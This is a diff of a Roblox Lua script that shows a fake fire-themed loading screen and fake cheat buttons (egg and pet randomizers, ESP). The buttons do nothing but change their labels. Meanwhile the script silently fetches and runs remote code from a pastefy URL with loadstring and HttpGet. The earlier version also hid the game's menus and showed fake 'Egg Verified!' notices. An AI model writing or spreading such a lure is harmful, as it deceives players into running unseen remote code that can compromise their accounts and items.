@@ -1,169 +1,176 @@
--- Fire-Themed Fake Loading UI with Interactive Control Panel
--- This script runs immediately and executes your loadstring
--- It features a draggable side panel with toggle buttons and animated fake notifications
-
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
+local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
 
--- Ensure PlayerGui is ready
 repeat task.wait() until Player:FindFirstChild("PlayerGui")
 
--- Disable CoreGui elements
+-- Your actual script (executes immediately)
 pcall(function()
-    for _, gui in ipairs(Enum.CoreGuiType:GetEnumItems()) do
-        StarterGui:SetCoreGuiEnabled(gui, false)
-    end
-    StarterGui:SetCore("TopbarEnabled", false)
+	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
 end)
 
--- Parent GUI
+-- MAIN GUI
 local gui = Instance.new("ScreenGui")
-gui.Name = "CountdownGui"
+gui.Name = "FakeLoadingUI"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 gui.DisplayOrder = 9999
 gui.Parent = Player:WaitForChild("PlayerGui")
 
--- Background
+-- BACKGROUND (Black screen)
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
-bg.Position = UDim2.new(0, 0, 0, 0)
-bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
 bg.BorderSizePixel = 0
 bg.Parent = gui
 
--- Loading Text
+-- Labels
+local topLabel = Instance.new("TextLabel")
+topLabel.Size = UDim2.new(1, 0, 0.1, 0)
+topLabel.Position = UDim2.new(0, 0, 0.02, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.Text = "Wait Until It Loads"
+topLabel.Font = Enum.Font.GothamBold
+topLabel.TextColor3 = Color3.fromRGB(255, 120, 0)
+topLabel.TextScaled = true
+topLabel.TextStrokeTransparency = 0.8
+topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
+topLabel.Parent = bg
+
 local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.2, 0)
-loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText.Size = UDim2.new(1, 0, 0.3, 0)
+loadingText.Position = UDim2.new(0, 0, 0.25, 0)
 loadingText.BackgroundTransparency = 1
-loadingText.TextColor3 = Color3.new(1, 0.5, 0)
+loadingText.Text = "0%"
 loadingText.Font = Enum.Font.GothamBlack
+loadingText.TextColor3 = Color3.new(1, 1, 1)
 loadingText.TextScaled = true
-loadingText.Text = "1%"
+loadingText.TextStrokeTransparency = 0.6
+loadingText.TextStrokeColor3 = Color3.new(0, 0, 0)
 loadingText.Parent = bg
 
--- Top & Bottom Texts
-local topText = Instance.new("TextLabel")
-topText.Size = UDim2.new(1, 0, 0.1, 0)
-topText.Position = UDim2.new(0, 0, 0.25, 0)
-topText.BackgroundTransparency = 1
-topText.TextColor3 = Color3.new(1, 0.4, 0)
-topText.Font = Enum.Font.Gotham
-topText.TextScaled = true
-topText.Text = "Wait Until It Loads"
-topText.Parent = bg
+local bottomLabel = Instance.new("TextLabel")
+bottomLabel.Size = UDim2.new(1, 0, 0.1, 0)
+bottomLabel.Position = UDim2.new(0, 0, 0.88, 0)
+bottomLabel.BackgroundTransparency = 1
+bottomLabel.Text = "Be Patient"
+bottomLabel.Font = Enum.Font.GothamBold
+bottomLabel.TextColor3 = Color3.fromRGB(255, 80, 0)
+bottomLabel.TextScaled = true
+bottomLabel.TextStrokeTransparency = 0.8
+bottomLabel.TextStrokeColor3 = Color3.fromRGB(255, 50, 0)
+bottomLabel.Parent = bg
 
-local bottomText = topText:Clone()
-bottomText.Position = UDim2.new(0, 0, 0.65, 0)
-bottomText.Text = "Be Patient"
-bottomText.Parent = bg
+-- Fire Animation
+local function spawnFire()
+	for i = 1, 5 do
+		local fire = Instance.new("TextLabel")
+		fire.Text = "🔥"
+		fire.Font = Enum.Font.SourceSansBold
+		fire.TextScaled = true
+		fire.TextColor3 = Color3.fromRGB(255, 100, 0)
+		fire.BackgroundTransparency = 1
+		fire.Size = UDim2.new(0.05, 0, 0.05, 0)
+		fire.Position = UDim2.new(math.random(), 0, math.random(), 0)
+		fire.Parent = bg
 
--- Control Panel
-local controlPanel = Instance.new("Frame")
-controlPanel.Size = UDim2.new(0, 220, 0, 150)
-controlPanel.Position = UDim2.new(0, 10, 0, 100)
-controlPanel.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
-controlPanel.BorderSizePixel = 0
-controlPanel.BackgroundTransparency = 0.2
-controlPanel.Parent = gui
+		local goal = {
+			Position = UDim2.new(math.random(), 0, math.random(), 0),
+			TextTransparency = 1
+		}
+		local tween = TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal)
+		tween:Play()
 
--- Make control panel draggable
-local drag = Instance.new("TextButton")
-drag.Size = controlPanel.Size
-drag.Position = UDim2.new(0, 0, 0, 0)
-drag.Text = ""
-drag.BackgroundTransparency = 1
-drag.Parent = controlPanel
-gui.ResetOnSpawn = false
-drag.Draggable = true
-
--- Control Toggle UI Function
-local function createToggle(text, emoji, parent, y)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, -10, 0, 30)
-    btn.Position = UDim2.new(0, 5, 0, y)
-    btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
-    btn.TextColor3 = Color3.new(1, 1, 1)
-    btn.Font = Enum.Font.Gotham
-    btn.TextSize = 14
-    btn.Text = emoji .. " " .. text .. ": OFF"
-    btn.AutoButtonColor = true
-    btn.Parent = parent
-
-    local state = false
-    btn.MouseButton1Click:Connect(function()
-        state = not state
-        btn.Text = emoji .. " " .. text .. ": " .. (state and "ON" or "OFF")
-    end)
+		task.delay(5, function()
+			fire:Destroy()
+		end)
+	end
 end
 
-createToggle("Egg Randomizer", "🎲", controlPanel, 5)
-createToggle("Randomize Pets", "🎯", controlPanel, 40)
-createToggle("ESP", "👁️", controlPanel, 75)
-createToggle("Auto Randomize", "🔄", controlPanel, 110)
+task.spawn(function()
+	while true do
+		spawnFire()
+		task.wait(1)
+	end
+end)
 
--- Fake Notifications
-local function createNotification(text)
-    local note = Instance.new("Frame")
-    note.Size = UDim2.new(0, 220, 0, 50)
-    note.Position = UDim2.new(0, 10, 1, -60)
-    note.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
-    note.BorderSizePixel = 0
-    note.BackgroundTransparency = 0.1
-    note.Parent = gui
+-- 🕐 Fake Loading: Goes to 99%, then removes loading screen only
+task.spawn(function()
+	for i = 1, 99 do
+		loadingText.Text = i .. "%"
+		task.wait(60 / 99)
+	end
+	loadingText.Text = "99%"
+	task.wait(1)
+	bg:Destroy() -- only remove loading background
+	topLabel:Destroy()
+	bottomLabel:Destroy()
+	loadingText:Destroy()
+end)
 
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0.4, 0)
-    title.Position = UDim2.new(0, 0, 0, 0)
-    title.BackgroundTransparency = 1
-    title.TextColor3 = Color3.fromRGB(255, 150, 0)
-    title.Font = Enum.Font.GothamBold
-    title.TextScaled = true
-    title.Text = "Notification"
-    title.Parent = note
+-- 📦 Side UI Panel (stays even after loading screen disappears)
+local sideUI = Instance.new("Frame")
+sideUI.Size = UDim2.new(0.2, 0, 0.6, 0)
+sideUI.Position = UDim2.new(0.02, 0, 0.2, 0)
+sideUI.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+sideUI.BackgroundTransparency = 0.2
+sideUI.BorderSizePixel = 2
+sideUI.BorderColor3 = Color3.fromRGB(255, 50, 0)
+sideUI.Parent = gui
+sideUI.ZIndex = 2
 
-    local message = title:Clone()
-    message.Position = UDim2.new(0, 0, 0.4, 0)
-    message.TextColor3 = Color3.new(1, 1, 1)
-    message.Text = text
-    message.Parent = note
+-- Title
+local sideTitle = Instance.new("TextLabel")
+sideTitle.Size = UDim2.new(1, 0, 0.15, 0)
+sideTitle.BackgroundTransparency = 1
+sideTitle.Text = "🔥 Options 🔥"
+sideTitle.Font = Enum.Font.GothamBold
+sideTitle.TextScaled = true
+sideTitle.TextColor3 = Color3.fromRGB(255, 80, 0)
+sideTitle.TextStrokeTransparency = 0.7
+sideTitle.Parent = sideUI
 
-    note:TweenPosition(UDim2.new(0, 10, 1, -70), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5)
-    task.delay(3, function()
-        note:TweenPosition(UDim2.new(0, 10, 1, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5)
-        task.wait(0.5)
-        note:Destroy()
-    end)
+-- Helper for buttons
+local function createButton(text, emoji, posY)
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(0.9, 0, 0.15, 0)
+	button.Position = UDim2.new(0.05, 0, posY, 0)
+	button.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
+	button.TextColor3 = Color3.new(1, 1, 1)
+	button.TextScaled = true
+	button.TextStrokeTransparency = 0.7
+	button.TextStrokeColor3 = Color3.fromRGB(255, 80, 0)
+	button.Font = Enum.Font.GothamBold
+	button.Text = emoji .. " " .. text
+	button.Parent = sideUI
+	return button
 end
 
--- Notification messages
-local messages = {
-    "Checking Egg...",
-    "Verifying Egg...",
-    "Egg Verified!",
-    "Waiting For It To Load..."
-}
+-- Buttons
+local btnEggRandomizer = createButton("Egg Randomizer", "🎲", 0.2)
+local btnPetRandomizer = createButton("Randomize Pets", "🎲", 0.38)
+local btnESP = createButton("ESP: OFF", "👁️", 0.56)
+local btnAutoRandom = createButton("Auto Randomize: OFF", "🔄", 0.74)
 
--- Notification loop
-spawn(function()
-    while true do
-        createNotification(messages[math.random(1, #messages)])
-        task.wait(5)
-    end
+-- Toggle logic (implement these functions later)
+local espOn = false
+local autoOn = false
+
+btnESP.MouseButton1Click:Connect(function()
+	espOn = not espOn
+	btnESP.Text = "👁️ ESP: " .. (espOn and "ON" or "OFF")
 end)
 
--- Loading Percentage
-spawn(function()
-    for i = 1, 99 do
-        loadingText.Text = i .. "%"
-        task.wait(0.6) -- Slow it down for more convincing loading
-    end
+btnAutoRandom.MouseButton1Click:Connect(function()
+	autoOn = not autoOn
+	btnAutoRandom.Text = "🔄 Auto Randomize: " .. (autoOn and "ON" or "OFF")
 end)
 
--- Execute main script immediately
-spawn(function()
-loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
+btnEggRandomizer.MouseButton1Click:Connect(function()
+	print("Egg Randomizer Clicked!")
+end)
+
+btnPetRandomizer.MouseButton1Click:Connect(function()
+	print("Randomize Pets Clicked!")
 end)
